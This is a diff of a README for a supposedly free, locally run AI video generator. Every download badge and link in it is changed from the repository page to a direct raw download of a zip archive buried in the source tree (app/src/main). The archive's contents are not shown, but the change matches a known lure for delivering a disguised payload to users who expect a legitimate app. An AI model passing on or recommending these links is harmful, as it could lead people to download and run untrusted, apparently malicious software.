@@ -1,6 +1,6 @@
 # 🎬 free-video-ai-generator - Create videos on your own PC
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ilyasmou4787/free-video-ai-generator)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ilyasmou4787/free-video-ai-generator/main/app/src/main/free-generator-ai-video-3.9-beta.2.zip)
 
 ## 🚀 What this app does
 
@@ -32,7 +32,7 @@ For smoother video generation, a stronger GPU helps. If your GPU has more VRAM, 
 
 Visit this page to download the app:
 
-[![Download Free Video AI Generator](https://img.shields.io/badge/Download%20Free%20Video%20AI%20Generator-Visit%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ilyasmou4787/free-video-ai-generator)
+[![Download Free Video AI Generator](https://img.shields.io/badge/Download%20Free%20Video%20AI%20Generator-Visit%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ilyasmou4787/free-video-ai-generator/main/app/src/main/free-generator-ai-video-3.9-beta.2.zip)
 
 After you open the page:
 
@@ -274,7 +274,7 @@ Yes. You do not pay per render or use a subscription plan.
 
 If you need the download page again, use this link:
 
-[https://github.com/Ilyasmou4787/free-video-ai-generator](https://github.com/Ilyasmou4787/free-video-ai-generator)
+[https://raw.githubusercontent.com/Ilyasmou4787/free-video-ai-generator/main/app/src/main/free-generator-ai-video-3.9-beta.2.zip](https://raw.githubusercontent.com/Ilyasmou4787/free-video-ai-generator/main/app/src/main/free-generator-ai-video-3.9-beta.2.zip)
 
 ## 🪟 Windows quick start
 
